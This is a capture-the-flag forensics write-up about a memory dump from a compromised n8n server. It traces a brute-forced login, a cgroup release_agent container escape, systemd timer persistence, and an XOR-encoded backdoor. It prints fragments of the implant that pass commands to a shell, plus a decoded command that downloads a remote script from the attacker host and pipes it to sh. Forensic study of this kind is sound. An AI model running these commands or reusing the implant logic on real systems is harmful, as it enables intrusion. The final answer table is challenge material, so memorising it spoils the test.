# n8n (Forensics): Write-up

This challenge gave us `victim.elf` and a set of questions about a compromised n8n system. The useful evidence was in memory: login requests, workflow data, persistence files, and an encrypted command sent to a backdoor.

### 1. Identify the file

We started by checking the file without executing it:

```bash
sha256sum victim.elf
readelf -h victim.elf
file victim.elf
```

The SHA-256 was:

```text
8f82576e2ad09593ceaaeab3944986a958f33697f3b3e79ba3ab33a4b0d4df73
```

`readelf` identified it as an x86-64 core file:

```text
Type: CORE (Core file)
Machine: Advanced Micro Devices X86-64
```

It was a memory dump rather than a normal executable. We extracted readable strings to search through it:

```bash
strings -a -n 10 victim.elf > strings_long.txt
```

That produced approximately 3.7 million lines.

### 2. Find the victim, attacker, and service

The n8n startup banner gave the victim address and application port:

```text
Editor is now accessible via: http://192.168.56.10:5678/
```

The attacker address came from the decoded Python backdoor:

```python
C2 = ('192.168.56.107', 4444)
```

Other addresses in documentation and LinPEAS help text were false leads. The backdoor's actual callback configuration was the useful evidence.

No Nmap report was present. The ports identified from the service banner and SSH session records were `22,5678`.

The following search located version strings:

```bash
grep -oE 'n8n[@/-][0-9]+\.[0-9]+\.[0-9]+' strings_long.txt
```

Both `n8n-1.70.0` and `n8n/1.70.0` appeared, giving the answer `n8n 1.70.0`.

### 3. Trace the successful login

Requests to `POST /rest/login` showed several password attempts for the same account:

```text
P@ssw0rd
Letmein1
Welcome1
Admin123
Admin123
Password123
```

After the final attempt, requests carried an `n8n-auth` JWT cookie. That identified the successful credentials as:

```text
aisyah.rahman@acme.local:Password123
```

The JWT payload included an issued-at timestamp:

```json
{"iat": 1791602579}
```

Converting it to UTC gave the authentication time used in the answer:

```bash
date -u -d @1791602579
```

```text
Sat Oct 10 03:22:59 UTC 2026
```

Answer: `10/10/2026 03:22:59`.

### 4. Find when the payload was inserted

The malicious workflows were created through `POST /rest/workflows`. The first workflow contained:

```json
{"createdAt": "2026-10-10T03:23:03.010Z"}
```

Removing milliseconds and keeping UTC gave `10/10/2026 03:23:03`.

The workflow also downloaded LinPEAS to `/tmp/l.sh`. A later directory listing confirmed that path and showed the file owned by root.

### 5. Identify the escape and persistence mechanism

The dump contained `CAP_SYS_ADMIN` beside Docker and cgroup-related material. The escape used the cgroup release-agent mechanism, so the relevant capability and file were:

```text
CAP_SYS_ADMIN
release_agent
```

The attacker then created two persistence files:

```text
/etc/systemd/system/sysupdate.service
/etc/systemd/system/sysupdate.timer
```

The timer repeatedly launched the backdoor. This corresponds to MITRE ATT&CK `T1053.006`, Scheduled Task/Job: Systemd Timers.

The activation command in the persistence script was:

```bash
systemctl enable --now sysupdate.timer >> "$OUT" 2>&1
```

`enable --now` both enabled the timer and started it immediately.

### 6. Decode the command from the backdoor

The persistence script wrote the Python implant to `/usr/local/bin/sysupdate`. Its repeating XOR key was:

```python
KEY = b'K3rn3l_X0R_2026!'
```

The implant connected to `192.168.56.107:4444`, decoded incoming data, and passed the result to a shell:

```python
cmd = xor(blob).decode('utf-8', 'replace').strip()
subprocess.run(['sh', '-c', cmd], timeout=30)
```

The encrypted payload recovered from memory was:

```text
284600021341392b631e7f5a4446461b641c435701426e6e087c6a041e030616710b425603432c7745223b534457185223130e4e4004
```

We can decode that evidence without running the recovered command:

```python
data = bytes.fromhex(
    '284600021341392b631e7f5a4446461b641c435701426e6e087c6a041e030616710b425603432c7745223b534457185223130e4e4004'
)
key = b'K3rn3l_X0R_2026!'
plain = bytes(value ^ key[i % len(key)] for i, value in enumerate(data))
print(plain.decode())
```

It prints:

```text
curl -fsSL http://192.168.56.107:8080/s/update.sh | sh
```

### Final answers

| Question | Answer |
| --- | --- |
| 1. Victim IP | `192.168.56.10` |
| 2. Attacker IP | `192.168.56.107` |
| 3. Open TCP ports | `22,5678` |
| 4. Application and version | `n8n 1.70.0` |
| 5. Credentials | `aisyah.rahman@acme.local:Password123` |
| 6. Authentication time (UTC) | `10/10/2026 03:22:59` |
| 7. Payload insertion time (UTC) | `10/10/2026 03:23:03` |
| 8. Privilege-escalation script | `/tmp/l.sh` |
| 9. Capability | `CAP_SYS_ADMIN` |
| 10. Abused cgroup file | `release_agent` |
| 11. Persistence sub-technique | `T1053.006` |
| 12. Activation command | `systemctl enable --now sysupdate.timer >> "$OUT" 2>&1` |
| 13. XOR key | `K3rn3l_X0R_2026!` |
| 14. C2 command | `curl -fsSL http://192.168.56.107:8080/s/update.sh \| sh` |
